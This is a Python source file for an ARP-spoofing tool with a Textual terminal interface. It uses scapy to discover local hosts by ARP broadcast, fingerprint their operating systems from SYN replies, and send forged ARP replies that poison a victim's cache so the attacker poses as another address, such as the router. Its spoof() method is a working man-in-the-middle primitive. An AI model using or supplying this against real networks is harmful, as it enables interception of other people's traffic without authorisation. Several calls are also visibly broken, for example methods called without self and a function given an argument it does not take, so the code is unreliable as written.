from scapy.all import *
from scapy.layers.l2 import ARP
from textual.app import App, ComposeResult
from textual.containers import Horizontal
from textual.widgets import Header, Footer, Input, Button
from textual._on import *

class Spoofer:
    def __init__(self):
        self.my_mac = get_if_hwaddr([i for i in get_if_list() if "wlan" in i][0])

    def get_own_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_addr = s.getsockname()[0]
        s.close()
        return ip_addr

    def get_router_ip_addr(self, own_ip):
        router_ip = own_ip[:own_ip.rfind(".")] + ".1"
        return router_ip

    #router_addr = get_router_ip_addr(get_own_ip_address())

    def get_os(self, ip, port):
        ip_p = IP(dst=ip)
        tcp_p = TCP(dport=port, flags="S")
        packet = ip_p / tcp_p
        response = sr1(packet, timeout=0.01, verbose=False)
        if not response:
            return None
        if response.haslayer(TCP):
            tcp_layer = response.getlayer(TCP)
            if "R" in tcp_layer.flags:
                return None
            ip_layer = response.getlayer(IP)
            window = tcp_layer.window
            ttl = ip_layer.ttl
            if ttl <= 64 and window in [32120, 5840]:
                print("Likely OS: Linux/FreeBSD")
            elif ttl <= 128:
                print("Likely OS: Windows")
            elif ttl >= 200:
                print("Likely OS: Cisco/Network Device")
            else:
                print("OS detection uncertain.")

            return window


    def request(self, ip):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        return arp_request

    def get_devices(self, ips):
        arp_request = request(ips)
        answered, unanswered = srp(arp_request, timeout=1, verbose=False)
        devices = []
        for sent, received in answered:
            device = {}
            device["ip"] = received.psrc
            print(received.psrc)
            info = None
            for port in [80, 49152]:
                info = get_os(received.psrc, port)
                print(port)
                if info:
                    break
            print(info)
            device["mac"] = received.hwsrc
            devices.append(device)
        return devices

    def get_mac(self, ip):
        arp_request = request(ip)
        answered, unanswered = srp(arp_request, timeout=2, verbose=False)
        if answered:
            return answered[0][1].hwsrc
        return None

    def spoof(self, pretending_ip, victim_ip):
        packet = ARP(op=2, hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip)
        send(packet, verbose=False)
    def restore(self, pretending_ip, victim_ip):
        packet = ARP(op=2, hwsrc=self.get_mac(pretending_ip), hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip)
        send(packet, verbose=False)

    def get_ip_range(self, limit):
        return self.get_router_ip_addr(self.get_own_ip_address()) + "/" + str(limit)




class SpoofApp(App):
    CSS = """
        Input {
            width: 40%;
        }
        
        Button {
            width: 10%;
        }
        
        """

    def __init__(self):
        super().__init__(self)
        self.spoofer = Spoofer()

    def compose(self) -> ComposeResult:
        yield(Horizontal(
         Input(placeholder="Limit ip", type="integer", id="#limit"),
         Button("✓", id="#enter_limit"))
        )

    @on(Button.Pressed, "#enter_limit")
    def on__b_enter_limit(self) -> None:
        limit = self.query_one("#limit", Input)

        self.spoofer.get_devices(self.spoofer.request(self.spoofer.get_own_ip_address(limit.value)))


if __name__ == "__main__":
    app = SpoofApp()
    app.run()